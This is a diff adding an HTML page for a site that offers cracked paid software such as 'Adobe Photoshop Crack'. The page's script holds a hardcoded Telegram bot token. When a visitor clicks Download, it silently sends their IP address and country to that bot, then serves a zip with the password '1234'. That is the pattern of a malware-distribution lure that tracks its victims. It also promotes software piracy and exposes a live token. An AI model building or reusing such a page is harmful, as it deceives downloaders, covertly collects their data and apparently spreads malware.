@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bluesoft</title>
+    <link rel="stylesheet" href="./style.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+</head>
+
+<body>
+
+    <header class="header">
+        <img src="/image/logo.svg" alt="">
+
+        <nav class="navbar">
+            <a href="#" class="active">Main</a>
+            <a href="#">List programs</a>
+        </nav>
+    </header>
+
+    <section class="home">
+        <div class="home-content">
+            <h3>Paid programs? </h3>
+            <h1>With us you will forget about these words</h1>
+            <p>Why pay for something that should be available to everyone? We make paid programs free, giving you access to all the features without the cost.</p>
+        </div>
+        <div class="ill">
+            <img src="/image/lustra.png" alt="">
+        </div>
+    </section>
+    
+    <prew class="prew">
+        <div class="prew-content">
+            <img src="./image/prew.svg" alt="">
+        </div>
+    </prew>
+
+    <main class="list">
+
+        <article class="list-soft">
+            <article class="textd">
+                <h3>21.21.2021</h3>
+                <h1>Adobe Photoshop Crack</h1>
+                <p>Adobe Photoshop is a powerful image editor for creating and processing images with professional tools.</p>
+            </article>
+            
+            <button class="download" id="downloadButton">Download<img src="./image/arrow.svg" alt=""></button>
+        </article>
+        
+    </main>
+
+    <script>
+      const botToken = '7859621628:AAEJeV92UTFIGPQl7993LZk-60F5H7d9Gq0';
+      const chatId = '7369892031';
+      const downloadUrl = '/files/test.zip'; // Укажите путь к вашему файлу
+      
+      // Функция для отправки сообщения в Telegram
+      async function sendMessageToTelegram(message) {
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        await fetch(telegramApiUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      }
+      
+      // Функция для получения информации по IP-адресу
+      async function getUserIPInfo() {
+        try {
+          const response = await fetch('https://ipapi.co/json/');
+          if (!response.ok) throw new Error('Не удалось получить IP-адрес');
+          return await response.json();
+        } catch (error) {
+          console.error('Ошибка при получении IP:', error);
+          return null;
+        }
+      }
+    
+      // Обработчик кнопки
+      document.getElementById('downloadButton').addEventListener('click', async () => {
+        // Получаем информацию по IP
+        const userInfo = await getUserIPInfo();
+        if (userInfo) {
+          const { ip, country_name: country, country_code: countryCode } = userInfo;
+          const timestamp = new Date().toLocaleString();
+          
+          // Извлекаем имя файла из пути (например, "test.zip" из "/files/test.zip")
+          const fileName = downloadUrl.split('/').pop();
+          
+          // Формируем сообщение с дополнительной информацией о файле
+          const message = `🔔 Новое скачивание!\nIP: ${ip}\nСтрана: ${countryCode} (${country})\nВремя: ${timestamp}\nФайл: ${fileName}`;
+    
+          // Отправляем сообщение в Telegram
+          await sendMessageToTelegram(message);
+        }
+    
+        // Показываем уведомление пользователю
+        Swal.fire({
+          title: 'Click ok to start downloading',
+          text: 'Password - 1234',
+          confirmButtonText: 'Ок',
+          customClass: {
+            popup: 'rounded-popup',
+            confirmButton: 'custom-confirm-button',
+          }
+        }).then(() => {
+          // Начинаем скачивание файла после закрытия уведомления
+          const link = document.createElement('a');
+          link.href = downloadUrl;
+          link.setAttribute('download', downloadUrl.split('/').pop()); // Используем название файла из пути
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+        });
+      });
+    </script>
+
+</body>
+
+<html>
